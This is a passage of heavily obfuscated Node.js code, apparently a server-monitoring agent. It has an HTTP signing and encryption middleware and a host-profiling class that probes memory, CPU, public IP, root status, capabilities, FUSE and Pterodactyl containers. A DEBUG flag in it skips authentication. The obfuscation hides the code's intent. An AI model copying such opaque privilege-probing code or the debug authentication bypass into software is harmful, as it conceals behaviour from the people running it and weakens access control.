            if (d[fq(0x4fa)]['startsWith'](fq(0x936)))
                return i[fq(0x5fd)](this, o);
            if (a0aE[fq(0x6c0)]) {
                const p = h[fq(0xe66)](typeof o, h[fq(0xc5f)]) ? o : Buffer[fq(0x24f)](o) ? o : JSON[fq(0x41c)](o);
                return f['set'](h['oNxTl'], h[fq(0xbe8)]), f[fq(0x42d)](h[fq(0x733)], Buffer[fq(0x735)](p)[fq(0x43a)]()), i[fq(0x5fd)](this, p);
            }
            if (f[fq(0xb12)](h['nNoWK']) && f[fq(0xb12)](h['nNoWK'])[fq(0x152)](h[fq(0x683)]))
                try {
                    if (d[fq(0xfbb)]) {
                        let q;
                        if (d[fq(0x4fa)] === h[fq(0x3a9)]) {
                            const r = h[fq(0xe66)](typeof o, fq(0xba0)) ? JSON['parse'](o) : o;
                            let s = null;
                            d[fq(0xf48)] === h[fq(0xae0)] && b && (s = b[fq(0x7f6)]());
                            const t = a[fq(0xc33)](r, s);
                            q = h[fq(0x5da)](typeof t, h['Dfbes']) ? t : JSON[fq(0x41c)](t);
                        } else {
                            const u = Buffer['isBuffer'](o) ? o : typeof o === h[fq(0xc5f)] ? Buffer[fq(0xca5)](o, h[fq(0x46f)]) : Buffer[fq(0xca5)](JSON[fq(0x41c)](o), h[fq(0x46f)]);
                            q = a[fq(0xdc6)](u, Buffer[fq(0xca5)](a0aE[fq(0xbd2)], h[fq(0x9d2)]));
                        }
                        return f['set'](fq(0x635), fq(0xf0e)), f[fq(0x42d)](h[fq(0xa45)], a0aE[fq(0x4a2)]), f['set'](fq(0x5d8), Buffer[fq(0x735)](q, h[fq(0x46f)])[fq(0x43a)]()), i[fq(0x5fd)](this, q);
                    } else {
                        const v = h[fq(0xe66)](typeof o, fq(0xba0)) ? o : JSON[fq(0x41c)](o);
                        return f[fq(0x42d)](h['jdXtG'], Buffer['byteLength'](v, h[fq(0x46f)])[fq(0x43a)]()), i[fq(0x5fd)](this, v);
                    }
                } catch (w) {
                    if (!f[fq(0x986)]) {
                        const x = JSON[fq(0x41c)]({ 'error': fq(0xe87)[fq(0x83f)](w[fq(0x769)]) });
                        return f[fq(0x13d)](0x1f4), f[fq(0x42d)]('Content-Type', fq(0xea9)), f[fq(0x42d)](h[fq(0x733)], Buffer[fq(0x735)](x, h[fq(0x46f)])[fq(0x43a)]()), i[fq(0x5fd)](this, x);
                    }
                    throw w;
                }
            return i[fq(0x5fd)](this, o);
        };
        const j = f[fo(0xdc9)];
        f['end'] = function (...o) {
            const fr = fo;
            return a0aE[fr(0x6c0)] && !d[fr(0x4fa)][fr(0x1ba)](c[fr(0x20c)]) && !f[fr(0xb12)](c[fr(0xe93)]) && f[fr(0x42d)](c[fr(0xe93)], fr(0x96e)), j[fr(0xfd2)](this, o);
        };
        if (d['method'] === c[fo(0x23b)] || c[fo(0x843)](d[fo(0x174)], c[fo(0x4ef)]))
            return a0aE['DEBUG'] && f[fo(0x42d)](c['oGksp'], c[fo(0x793)]), c[fo(0x5e7)](g);
        d[fo(0xfbb)] = ![];
        const k = [
            c['qFpBa'],
            c['RpvnC']
        ];
        if (a0aE[fo(0x6c0)])
            return d['is_authenticated'] = !![], g();
        const l = d[fo(0x57f)][c[fo(0x467)]] || d['headers'][c[fo(0x2fc)]], m = d['headers']['x-timestamp'] || d[fo(0x57f)][c[fo(0x8a9)]], n = d[fo(0x57f)][c[fo(0x1cb)]] || d[fo(0x57f)][c[fo(0x99c)]];
        if (!l || !m || !n)
            return k['includes'](d[fo(0x4fa)]) ? c[fo(0x676)](g) : f['status'](0x191)['json']({ 'error': c[fo(0x90b)] });
        try {
            let o = Buffer['alloc'](0x0);
            if (d[fo(0x4fa)] !== fo(0xe22) && !(d[fo(0x4fa)][fo(0x1ba)](c[fo(0x20c)]) && d[fo(0x4fa)] !== c[fo(0x80f)])) {
                if (Buffer[fo(0x24f)](d[fo(0x344)]))
                    o = d['body'];
                else {
                    if (c['izMpC'](typeof d[fo(0x344)], fo(0xba0)))
                        o = Buffer[fo(0xca5)](d[fo(0x344)], c['XlpJN']);
                }
            }
            const p = c[fo(0xfb2)](o[fo(0xc54)], 0x0) ? a0k[fo(0x282)](c[fo(0x36f)])['update'](o)['digest'](c[fo(0x5e0)]) : '', q = b ? b[fo(0x9c4)]() : null, r = a[fo(0x46d)](d[fo(0x174)], d[fo(0x4fa)], p, l, m, n, q);
            d['is_authenticated'] = !![], d[fo(0xf48)] = c['hzQgc'](r, c[fo(0xa97)]) ? fo(0xb3b) : c[fo(0x9a8)];
        } catch (s) {
            return k[fo(0x152)](d[fo(0x4fa)]) ? c[fo(0xc4d)](g) : f[fo(0x13d)](0x191)[fo(0xb56)]({ 'error': fo(0x972)[fo(0x83f)](s[fo(0x769)]) });
        }
        if (d[fo(0x344)] && typeof d[fo(0x344)] === fo(0xba0)) {
            const t = c[fo(0xab2)]((d['headers'][c['YnmZO']] || '')[fo(0x544)](), fo(0xf0e));
            try {
                if (t && d[fo(0xfbb)]) {
                    const u = Buffer[fo(0xca5)](a0aE[fo(0xbd2)], c['NjhUc']), v = a[fo(0xe98)](d[fo(0x344)], u);
                    d[fo(0x344)] = JSON[fo(0xadd)](v);
                } else {
                    if (d[fo(0x344)]['startsWith'](fo(0x458))) {
                        const w = Buffer[fo(0xca5)](d['body'], c[fo(0x389)])[fo(0x43a)](c['XlpJN']);
                        d[fo(0x344)] = JSON[fo(0xadd)](w);
                    } else {
                        if (d[fo(0x344)][fo(0x5b0)]()[fo(0x1ba)]('{') || d[fo(0x344)][fo(0x5b0)]()[fo(0x1ba)]('['))
                            d[fo(0x344)] = JSON[fo(0xadd)](d[fo(0x344)]);
                        else {
                            if (c[fo(0x23c)](d[fo(0x344)][fo(0x5b0)](), ''))
                                d[fo(0x344)] = {};
                        }
                    }
                }
            } catch (x) {
                return a0R[fo(0xfcc)]('💥\x20[Body\x20Parse\x20Error]:\x20'[fo(0x83f)](x[fo(0x769)])), f[fo(0x13d)](0x190)[fo(0xb56)]({ 'error': fo(0xbe6)[fo(0x83f)](x[fo(0x769)]) });
            }
        }
        c[fo(0x866)](g);
    };
}
class a0aP {
    constructor() {
        const ft = a0d9, a = {
                'fwIsO': function (b, c) {
                    return b / c;
                }
            };
        this[ft(0x954)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[ft(0x3e5)] = 0x0, this['totalNetworkDown'] = 0x0, this[ft(0xd46)] = a[ft(0x7f4)](Date['now'](), 0x3e8);
    }
    async [a0d9(0xec8)]() {
        const fu = a0d9, a = {
                'eZDDF': function (d, f, g) {
                    return d(f, g);
                },
                'hIxio': fu(0xb76),
                'lsRwq': function (d, f, g) {
                    return d(f, g);
                },
                'aZcry': fu(0xf98),
                'icvFa': 'utf8',
                'WJAXx': function (d, f) {
                    return d === f;
                },
                'BCVpq': function (d, f) {
                    return d(f);
                },
                'rsMIJ': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[fu(0xa0a)](fu(0xfbf), 'utf8'))[fu(0x5b0)]();
            b = d === 'max' ? null : parseInt(d, 0xa), c = parseInt((await a0m[fu(0xa0a)]('/sys/fs/cgroup/memory.current', 'utf8'))[fu(0x5b0)](), 0xa);
        } catch {
            try {
                b = a['eZDDF'](parseInt, (await a0m[fu(0xa0a)](a[fu(0x6f6)], 'utf8'))[fu(0x5b0)](), 0xa), c = a[fu(0x718)](parseInt, (await a0m[fu(0xa0a)](a['aZcry'], a[fu(0xd2b)]))['trim'](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0u['mem']();
                b = f[fu(0x3b1)], c = f[fu(0x96a)];
            }
        }
        if (b === null) {
            const g = await a0u[fu(0xf97)]();
            b = g['total'], (a[fu(0xd96)](c, null) || a[fu(0xd3e)](isNaN, c)) && (c = g[fu(0x96a)]);
        }
        return {
            'total': b,
            'used': c,
            'available': b - c,
            'free': a[fu(0x855)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0d9(0xa88)]() {
        const fv = a0d9, a = await this[fv(0x2f2)](), b = await this['collectLocalInfo'](a['virtualization']), c = await this[fv(0x425)](), d = a0aP[fv(0x2a8)](a, b, c);
        return a0R[fv(0xac2)](fv(0xe8e)[fv(0x83f)](JSON[fv(0x41c)](d, null, 0x2)), 0x1), d;
    }
    static [a0d9(0x2a8)](a, b, c) {
        const fw = a0d9;
        return {
            'arch': a[fw(0xa05)],
            'cpu_cores': a['cpu_cores'],
            'cpu_name': a[fw(0x31b)],
            'disk_total': b['disk_total'],
            'gpu_name': a['gpu_name'],
            'ipv4': c['ipv4'] ?? null,
            'ipv6': c[fw(0xa3a)] ?? null,
            'mem_total': b[fw(0xa52)],
            'os': a['os'],
            'kernel_version': a[fw(0x74d)],
            'swap_total': b[fw(0x2f0)],
            'version': a['version'],
            'virtualization': a[fw(0x1f0)],
            'marks': Array[fw(0xedd)](a['marks']) ? [...a[fw(0x3d5)]] : []
        };
    }
    static [a0d9(0xfaf)]() {
        const fx = a0d9;
        return {
            'arch': '',
            'cpu_cores': 0x0,
            'cpu_name': '',
            'gpu_name': '',
            'os': '',
            'kernel_version': '',
            'version': a0aE[fx(0x4a2)],
            'virtualization': '',
            'marks': []
        };
    }
    static [a0d9(0x772)]() {
        return {
            'disk_total': 0x0,
            'mem_total': 0x0,
            'swap_total': 0x0
        };
    }
    static [a0d9(0xff2)]() {
        return {
            'ipv4': null,
            'ipv6': null
        };
    }
    async ['collectStaticInfo']() {
        const fy = a0d9;
        let a = {}, b = {};
        try {
            a = await a0u['cpu']();
        } catch (d) {
            a0R['debug']('获取\x20CPU\x20信息失败:\x20'[fy(0x83f)](d['message']), 0x1);
        }
        try {
            b = await a0u[fy(0xc13)]();
        } catch (f) {
            a0R[fy(0xac2)](fy(0x8ad)[fy(0x83f)](f[fy(0x769)]), 0x1);
        }
        let c = '';
        try {
            c = await this[fy(0x7d1)]();
        } catch (g) {
            a0R['debug'](fy(0xc3a)['concat'](g[fy(0x769)]), 0x1);
        }
        return {
            'arch': a0p['arch']() || '',
            'cpu_cores': a[fy(0x4b2)] || 0x0,
            'cpu_name': a[fy(0x1f1)] || '',
            'gpu_name': '',
            'os': ''[fy(0x83f)](b[fy(0x54d)] || '', '\x20')[fy(0x83f)](b[fy(0x4a9)] || '')[fy(0x5b0)](),
            'kernel_version': b[fy(0x378)] || '',
            'version': a0aE[fy(0x4a2)],
            'virtualization': c,
            'marks': this[fy(0xd6f)]()
        };
    }
    async [a0d9(0xc2f)](a) {
        const fz = a0d9;
        let b = 0x0;
        try {
            b = (await a0u[fz(0xf6b)]())[0x0]?.[fz(0x885)] || 0x0;
        } catch (d) {
            a0R[fz(0xac2)]('获取磁盘总容量失败:\x20'['concat'](d[fz(0x769)]), 0x1);
        }
        let c = {
            'total': 0x0,
            'swaptotal': 0x0
        };
        try {
            c = await this[fz(0xec8)]() || c;
        } catch (f) {
            a0R[fz(0xac2)](fz(0xd3f)[fz(0x83f)](f[fz(0x769)]), 0x1);
        }
        return {
            'disk_total': b,
            'mem_total': c[fz(0x3b1)] || 0x0,
            'swap_total': c[fz(0x794)] || 0x0
        };
    }
    async [a0d9(0x425)]() {
        const fA = a0d9, a = {
                'RePcS': function (d, f) {
                    return d === f;
                },
                'XYigH': fA(0x26a),
                'jJEDq': fA(0xdca)
            }, [b, c] = await Promise[fA(0x197)]([
                this[fA(0xbb8)](),
                this[fA(0x2d4)]()
            ]);
        if (a[fA(0x17a)](b[fA(0x13d)], 'rejected'))
            a0R['debug']('获取\x20IPv4\x20失败:\x20'['concat'](b[fA(0xe61)]), 0x1);
        if (c['status'] === a[fA(0xf0b)])
            a0R[fA(0xac2)](fA(0x702)[fA(0x83f)](c['reason']), 0x1);
        return {
            'ipv4': a[fA(0x17a)](b['status'], a['jJEDq']) ? b['value'] : null,
            'ipv6': c[fA(0x13d)] === fA(0xdca) ? c[fA(0x72a)] : null
        };
    }
    static ['MARKS_PROC_ROOT'] = '/proc';
    static ['MARKS_DEV_ROOT'] = a0d9(0x383);
    static ['MARKS_ETC_ROOT'] = a0d9(0xa6b);
    static [a0d9(0xfcf)] = '/run';
    static [a0d9(0x6d2)] = '/';
    [a0d9(0xd6f)]() {
        const fB = a0d9, a = {
                'YObpm': function (d, f) {
                    return d === f;
                },
                'nRtqJ': fB(0xb0c),
                'ZVRiR': fB(0x7cd),
                'QZELX': fB(0xa4d),
                'dLQdw': fB(0xfa3),
                'vYUGX': 'netadmin',
                'qEvGG': 'kmode1',
                'YOPFe': fB(0xfb5),
                'vvOdc': 'kmode3',
                'GJxPI': function (d) {
                    return d();
                },
                'GVdVR': fB(0x8bf)
            }, b = [];
        if (a[fB(0x263)](process[fB(0x4a4)], fB(0x6a3))) {
            const d = [
                [
                    a['nRtqJ'],
                    () => this[fB(0xb72)]()
                ],
                [
                    a[fB(0x70b)],
                    () => this[fB(0x82e)]()
                ],
                [
                    a[fB(0x2ef)],
                    () => this[fB(0x5e8)]()
                ],
                [
                    a[fB(0x4b4)],
                    () => this[fB(0x208)]()
                ],
                [
                    fB(0xca3),
                    () => this['_markFuse']()
                ],
                [
                    a[fB(0x291)],
                    () => this['_markNetadmin']()
                ]
            ];
            for (const [f, g] of d) {
                try {
                    if (g())
                        b[fB(0xb66)](f);
                } catch (h) {
                    a0R[fB(0xac2)](fB(0xd3c)[fB(0x83f)](f, fB(0x45b))[fB(0x83f)](h[fB(0x769)]), 0x1);
                }
            }
        }
        const c = [
            [
                'kstore',
                () => this[fB(0xbb5)]()
            ],
            [
                a['qEvGG'],
                () => this[fB(0x465)]()
            ],
            [
                a[fB(0x790)],
                () => this[fB(0xf7e)]()
            ],
            [
                a['vvOdc'],
                () => this[fB(0x14f)]()
            ]
        ];
        for (const [i, j] of c) {
            try {
                if (a['GJxPI'](j))
                    b['push'](i);
            } catch (k) {
                a0R[fB(0xac2)](fB(0xd3c)[fB(0x83f)](i, fB(0x45b))[fB(0x83f)](k[fB(0x769)]), 0x1);
            }
        }
        return a0R[fB(0xac2)](fB(0xa07)['concat'](b[fB(0xd9d)](',') || a[fB(0x682)]), 0x1), b;
    }
    [a0d9(0xbb5)]() {
        const fC = a0d9, a = {
                'ZCdbO': function (b, c) {
                    return b === c;
                }
            };
        return a[fC(0xdb1)](a0aW[fC(0xc3e)]['enabled'], !![]);
    }
    ['_markKmode1']() {
        const fD = a0d9, a = {
                'ifbgU': function (b, c) {
                    return b === c;
                }
            };
        return a['ifbgU'](a0aE[fD(0x17d)], '1');
    }
    [a0d9(0xf7e)]() {
        const fE = a0d9, a = {
                'gCjxc': function (b, c) {
                    return b === c;
                }
            };
        return a[fE(0xcc2)](a0aE[fE(0x17d)], '2');
    }
    [a0d9(0x14f)]() {
        const fF = a0d9, a = {
                'AxSdN': function (b, c) {
                    return b === c;
                }
            };
        return a['AxSdN'](a0aE[fF(0x17d)], '3');
    }
    [a0d9(0xb72)]() {
        const fG = a0d9, a = {
                'vJKjo': function (b, c) {
                    return b !== c;
                },
                'ZzIdH': fG(0xd40),
                'eNcLM': function (b, c) {
                    return b !== c;
                }
            };
        if (a['vJKjo'](typeof process[fG(0x8b5)], a[fG(0xf12)]) || a['eNcLM'](typeof process['getegid'], a[fG(0xf12)]))
            return ![];
        return process[fG(0x8b5)]() === 0x0 && process['getegid']() === 0x0;
    }
    [a0d9(0x82e)]() {
        const fH = a0d9;
        return a0aP[fH(0xcb2)](a0o[fH(0xd9d)](a0aP[fH(0x9f8)], fH(0x7cd)), 0xa, 0xe8);
    }
    [a0d9(0xd29)]() {
        const fI = a0d9, a = {
                'GvTmD': fI(0xca3),
                'aempV': 'usr/bin/fusermount3',
                'yDFEf': 'usr/bin/fusermount',
                'nXDmi': fI(0xe58),
                'CTKBO': function (b, c) {
                    return b & c;
                },
                'JZfMk': function (b, c) {
                    return b & c;
                }
            };
        if (!a0aP[fI(0xcb2)](a0o[fI(0xd9d)](a0aP[fI(0x9f8)], a[fI(0xaae)]), 0xa, 0xe5))
            return ![];
        if (this['_capEffBit'](0x15))
            return !![];
        for (const b of [
                a[fI(0x449)],
                'bin/fusermount3',
                a[fI(0xb0e)],
                a[fI(0xb20)]
            ]) {
            try {
                const c = a0l[fI(0x91f)](a0o[fI(0xd9d)](a0aP[fI(0x6d2)], b));
                if (c[fI(0xaf5)]() && a[fI(0x91b)](c[fI(0x56f)], 0x800) && a[fI(0x3bc)](c['mode'], 0x49))
                    return !![];
            } catch {
            }
        }
        return ![];
    }
    ['_markNetadmin']() {
        const fJ = a0d9;
        return this[fJ(0xe2f)](0xc);
    }
    ['_markPterodactyl']() {
        const fK = a0d9, a = {
                'sbjeE': 'self',
                'bYscP': fK(0xd0a),
                'QgGNK': 'home',
                'vlnPl': 'container',
                'bPdUy': function (g, h) {
                    return g !== h;
                },
                'OsKdD': fK(0x600),
                'TtsSh': fK(0xec2),
                'LVubR': function (g, h) {
                    return g > h;
                },
                'gDZye': function (g, h) {
                    return g === h;
                },
                'YSvAG': function (g, h) {
                    return g(h);
                },
                'fxVYu': fK(0xe8b),
                'onEEO': '.containerenv'
            };
        if (a0aP[fK(0x469)](a0o[fK(0xd9d)](a0aP[fK(0x17b)], a[fK(0xc0c)], fK(0x1be)), Buffer[fK(0xca5)](fK(0x1c2))))
            return !![];
        for (const g of [
                a[fK(0xc0c)],
                '1'
            ]) {
            const h = a0aP[fK(0x392)](a0o[fK(0xd9d)](a0aP['MARKS_PROC_ROOT'], g, a[fK(0xcac)]));
            if (!h)
                continue;
            const i = h[fK(0x43a)]('utf8')[fK(0xa6a)]('\x00'), j = i[fK(0x286)](l => l[fK(0x1ba)](fK(0xca6))), k = i[fK(0x286)](l => l[fK(0x1ba)](fK(0xe4a)));
            if (j && k)
                return !![];
        }
        const b = a0aP[fK(0x392)](a0o[fK(0xd9d)](a0aP[fK(0x711)], fK(0x8d1)));
        if (!b)
            return ![];
        const c = b['toString'](fK(0xec2))[fK(0x5b0)]()[fK(0x544)]();
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/[fK(0xf92)](c))
            return ![];
        try {
            if (!a0l[fK(0x91f)](a0o[fK(0xd9d)](a0aP[fK(0x6d2)], a[fK(0x4a5)], a[fK(0x53f)]))[fK(0x6f4)]())
                return ![];
        } catch {
            return ![];
        }
        if (a[fK(0x234)](typeof process['geteuid'], 'function'))
            return ![];
        const d = process[fK(0x8b5)](), f = a0aP[fK(0x392)](a0o[fK(0xd9d)](a0aP[fK(0x711)], a['OsKdD']));
        if (!f)
            return ![];
        for (const l of f[fK(0x43a)](a[fK(0xaff)])[fK(0xa6a)]('\x0a')) {
            const m = l[fK(0xa6a)](':');
            if (a[fK(0xcd5)](m[fK(0xc54)], 0x2) && a[fK(0xe80)](a[fK(0xbaf)](Number, m[0x2]), d))
                return ![];
        }
        return a0l['existsSync'](a0o[fK(0xd9d)](a0aP[fK(0x6d2)], a[fK(0xafb)])) || a0l[fK(0x8de)](a0o[fK(0xd9d)](a0aP[fK(0xfcf)], a[fK(0x7b2)]));
    }
    [a0d9(0x208)]() {
        const fL = a0d9, a = {
                'OXXtI': 'systemd',
                'JjCZC': fL(0x9f1),
                'XvSSs': fL(0x8cb),
                'UlXIj': fL(0x774),
                'Gthnk': 'utf8'
            };
        try {
            if (!a0l[fL(0x91f)](a0o[fL(0xd9d)](a0aP[fL(0xfcf)], a['OXXtI'], fL(0xf6e)))[fL(0x6f4)]())
                return ![];
        } catch {
            return ![];
        }
        if (!a0l['existsSync'](a0o[fL(0xd9d)](a0aP[fL(0xfcf)], a[fL(0x9c2)], a[fL(0x259)])) && !a0l[fL(0x8de)](a0o[fL(0xd9d)](a0aP[fL(0xfcf)], fL(0x277), a[fL(0x872)])))
            return ![];
        if (!a0aP[fL(0x8fc)]())
            return ![];
        const b = a0aP[fL(0x392)](a0o['join'](a0aP[fL(0x17b)], '1', a['UlXIj']));
        if (b) {
            const c = b[fL(0x43a)](a[fL(0x452)])[fL(0x5b0)]();
            if (c)
                return c[fL(0x544)]()[fL(0x152)](a[fL(0x9c2)]);
        }
        try {
            const d = a0l[fL(0xddb)](a0o[fL(0xd9d)](a0aP[fL(0x17b)], '1', fL(0x1012)));
            if (d && !a0o[fL(0xe49)](d)[fL(0x544)]()['includes'](a[fL(0x9c2)]))
                return ![];
        } catch {
        }
        return !![];
    }
    ['_capEffBit'](a) {
        const fM = a0d9, b = {
                'gQIxw': 'self',
                'PNmfs': fM(0x13d),
                'hUUwz': fM(0xec2),
                'NcuBW': fM(0xb94),
                'iONEK': function (d, f) {
                    return d < f;
                },
                'yGvfA': function (d, f) {
                    return d === f;
                },
                'JYVNd': function (d, f) {
                    return d & f;
                },
                'DhZlK': function (d, f) {
                    return d >> f;
                },
                'jLBeo': function (d, f) {
                    return d(f);
                },
                'elWpj': function (d, f) {
                    return d + f;
                },
                'yMxaV': function (d, f) {
                    return d(f);
                }
            }, c = a0aP[fM(0x392)](a0o[fM(0xd9d)](a0aP['MARKS_PROC_ROOT'], b['gQIxw'], b['PNmfs']));
        if (!c)
            return ![];
        for (const d of c[fM(0x43a)](b['hUUwz'])[fM(0xa6a)]('\x0a')) {
            if (d[fM(0x1ba)](b[fM(0x8a6)])) {
                const f = d[fM(0xa6a)](/\s+/);
                if (b[fM(0xee1)](f[fM(0xc54)], 0x2))
                    return ![];
                try {
                    return b[fM(0xd01)](b[fM(0xde6)](b['DhZlK'](b[fM(0x147)](BigInt, b['elWpj']('0x', f[0x1])), b[fM(0x937)](BigInt, a)), 0x1n), 0x1n);
                } catch {
                    return ![];
                }
            }
        }
        return ![];
    }
    static [a0d9(0x8fc)]() {
        const fN = a0d9, a = {
                'VJgZR': 'usr/bin/systemctl',
                'vNWjq': fN(0x4a6),
                'qsyHS': fN(0x5aa),
                'aOWAP': fN(0x15a)
            };
        for (const b of [
                a[fN(0x8cf)],
                a[fN(0x62c)],
                a[fN(0x751)]
            ]) {
            if (a0aP['_executable'](a0o[fN(0xd9d)](a0aP[fN(0x6d2)], b)))
                return !![];
        }
        for (const c of (process.env.PATH || '')[fN(0xa6a)](a0o[fN(0x824)])) {
            if (c && a0aP[fN(0x1fe)](a0o[fN(0xd9d)](c, a[fN(0x35d)])))
                return !![];
        }
        return ![];
    }
    static [a0d9(0x1fe)](a) {
        const fO = a0d9, b = {
                'UZkmh': function (c, d) {
                    return c !== d;
                }
            };
        try {
            const c = a0l[fO(0x91f)](a);
            return c[fO(0xaf5)]() && b[fO(0x5dd)](c[fO(0x56f)] & 0x49, 0x0);
        } catch {
            return ![];
        }
    }
    static [a0d9(0xcb2)](a, b, c) {
        const fP = a0d9, d = {
                'VYQHk': function (f, g) {
                    return f !== g;
                },
                'wObOk': function (f, g) {
                    return f !== g;
                }
            };
        try {
            const f = a0l[fP(0x91f)](a);
            if (!f[fP(0x2e8)]())
                return ![];
            if (d[fP(0xda7)](a0aP[fP(0xc20)](f[fP(0x9a2)]), b) || d[fP(0xc40)](a0aP[fP(0x104d)](f[fP(0x9a2)]), c))
                return ![];
            const g = a0l[fP(0x8cc)](a, 'r+');
            try {
                return !![];
            } finally {
                a0l[fP(0xd7a)](g);
            }
        } catch {
            return ![];
        }
    }
    static [a0d9(0xc20)](a) {
        const fQ = a0d9, b = {
                'tYebT': function (f, g) {
                    return f / g;
                },
                'pKVtK': function (f, g) {
                    return f >>> g;
                },
                'MqdzE': function (f, g) {
                    return f & g;
                }
            }, c = Math[fQ(0x568)](b[fQ(0xa1a)](a, 0x100)) % 0x1000, d = Math[fQ(0x568)](a / 0x100000000);
        return b[fQ(0x9ce)](c | b[fQ(0x665)](d, ~0xfff), 0x0);
    }
    static [a0d9(0x104d)](a) {
        const fR = a0d9, b = {
                'hSpDj': function (f, g) {
                    return f % g;
                },
                'YodTy': function (f, g) {
                    return f % g;
                },
                'BfDgG': function (f, g) {
                    return f / g;
                },
                'erCnc': function (f, g) {
                    return f | g;
                }
            }, c = b[fR(0x358)](a, 0x100), d = b['YodTy'](Math['floor'](b[fR(0x1d5)](a, 0x1000)), 0x100000) & 0xfff00;
        return b[fR(0x6b8)](c, d) >>> 0x0;
    }
    static ['_readLimited'](a, b = 0x400 * 0x400) {
        const fS = a0d9, c = {
                'GthPb': function (f, g) {
                    return f - g;
                }
            };
        let d = null;
        try {
            d = a0l[fS(0x8cc)](a, 'r');
            const f = Buffer['alloc'](0x2000), g = [];
            let h = 0x0;
            while (h < b) {
                const i = a0l['readSync'](d, f, 0x0, Math['min'](f[fS(0xc54)], c[fS(0x3ae)](b, h)), null);
                if (!i)
                    break;
                g[fS(0xb66)](Buffer['from'](f[fS(0xad0)](0x0, i))), h += i;
            }
            return Buffer['concat'](g);
        } catch {
            return null;
        } finally {
            if (d !== null)
                try {
                    a0l['closeSync'](d);
                } catch {
                }
        }
    }
    static [a0d9(0x469)](a, b, c = 0x400 * 0x400, d = 0x2000) {
        const fT = a0d9, f = {
                'LRhYm': function (h, i) {
                    return h - i;
                },
                'kGLOP': function (h, i) {
                    return h < i;
                },
                'GYDPW': function (h, i) {
                    return h - i;
                },
                'GOSeH': function (h, i) {
                    return h !== i;
                },
                'yCEfw': function (h, i) {
                    return h - i;
                }
            };
        let g = null;
        try {
            g = a0l['openSync'](a, 'r');
            const h = Math[fT(0x37f)](0x0, f['LRhYm'](b[fT(0xc54)], 0x1)), i = Buffer[fT(0x901)](d);
            let j = Buffer[fT(0x901)](0x0), k = 0x0;
            while (f[fT(0x63d)](k, c)) {
                const l = a0l[fT(0x1020)](g, i, 0x0, Math[fT(0x100f)](d, f[fT(0x720)](c, k)), null);
                if (!l)
                    break;
                k += l;
                const m = Buffer[fT(0x83f)]([
                    j,
                    i[fT(0xad0)](0x0, l)
                ]);
                if (f[fT(0x287)](m[fT(0xe0a)](b), -0x1))
                    return !![];
                j = h ? Buffer['from'](m['subarray'](Math[fT(0x37f)](0x0, f[fT(0xf23)](m[fT(0xc54)], h)))) : Buffer[fT(0x901)](0x0);
            }
            return ![];
        } catch {
            return ![];
        } finally {
            if (g !== null)
                try {
                    a0l['closeSync'](g);
                } catch {
                }
        }
    }
    ['getLocalIPv4']() {
        const fU = a0d9, a = {
                'CzwMr': function (c, d) {
                    return c === d;
                },
                'FfJZW': fU(0x1029)
            }, b = a0p[fU(0xee3)]();
        for (const c of Object[fU(0xfa8)](b)) {
            for (const d of b[c]) {
                const f = a['CzwMr'](d['family'], a[fU(0xda3)]) || a[fU(0x3df)](d[fU(0xc66)], 0x4);
                if (f && !d['internal']) {
                    if (!/^10\./['test'](d[fU(0x2bb)]) && !/^192\.168\./[fU(0xf92)](d[fU(0x2bb)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d[fU(0x2bb)]))
                        return d[fU(0x2bb)];
                }
            }
        }
        return null;
    }
    async [a0d9(0xbb8)]() {
        const fV = a0d9, a = {
                'tGtvD': fV(0xae1),
                'MwvpM': fV(0xc8b),
                'zVIVs': fV(0x2e5),
                'muekw': fV(0xa10),
                'mgOTu': fV(0xb1d),
                'DgWtb': fV(0xfce)
            }, b = [
                a[fV(0xb0a)],
                a[fV(0xf06)],
                a[fV(0x52a)],
                a[fV(0xa7e)],
                a[fV(0xa08)],
                a['DgWtb'],
                'https://myexternalip.com/raw'
            ];
        for (const d of b) {
            try {
                const f = await this[fV(0xed8)](d, 0x4);
                if (f && this['isValidIPv4'](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[fV(0xa7f)]();
        if (c && this[fV(0x8e4)](c))
            return c;
        return null;
    }
    [a0d9(0xa64)]() {
        const fW = a0d9, a = {
                'YucAm': 'IPv6',
                'FmCYr': function (c, d) {
                    return c === d;
                }
            }, b = a0p['networkInterfaces']();
        for (const c of Object[fW(0xfa8)](b)) {
            for (const d of b[c]) {
                const f = d['family'] === a[fW(0x77d)] || a[fW(0xe71)](d['family'], 0x6);
                if (f && !d[fW(0xe0f)]) {
                    if (!d['address']['toLowerCase']()[fW(0x1ba)](fW(0xfec)))
                        return d[fW(0x2bb)];
                }
            }
        }
        return null;
    }
    async [a0d9(0x2d4)]() {
        const fX = a0d9, a = {
                'BttRC': 'https://api6.ipify.org',
                'fUYYV': fX(0xc8b),
                'twmQe': fX(0x2c1)
            }, b = this[fX(0xa64)]();
        if (b && this['isValidIPv6'](b))
            return b;
        const c = [
            a[fX(0x5be)],
            a[fX(0x357)],
            a[fX(0x478)]
        ];
        for (const d of c) {
            try {
                const f = await this['fetchIP'](d, 0x6);
                if (f && this[fX(0x2f1)](f))
                    return f;
            } catch (g) {
                a0R[fX(0xac2)]('访问\x20'[fX(0x83f)](d, fX(0x239))[fX(0x83f)](g[fX(0x769)]));
                continue;
            }
        }
        return null;
    }
    async [a0d9(0xed8)](a, b = 0x0) {
        const fY = a0d9, c = {
                'EOgTy': function (d, f) {
                    return d(f);
                },
                'LJrlF': fY(0x50f),
                'ymVSY': function (d, f) {
                    return d !== f;
                },
                'XtuXL': fY(0xe83),
                'kMcbe': fY(0xdc9),
                'xhfiB': function (d, f) {
                    return d(f);
                },
                'nFLXi': fY(0xda4),
                'hNWCY': fY(0x213)
            };
        return new Promise((d, f) => {
            const g1 = fY, g = {
                    'xFYuh': function (k, l) {
                        const fZ = a0b;
                        return c[fZ(0xf4c)](k, l);
                    },
                    'QYsGt': function (k, l) {
                        const g0 = a0b;
                        return c[g0(0x8ab)](k, l);
                    },
                    'RJBXZ': c[g1(0x434)],
                    'aXrLl': c['kMcbe']
                }, h = c[g1(0x505)](require, c[g1(0x603)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[g1(0x64a)] }
                }, j = h[g1(0xb12)](a, i, k => {
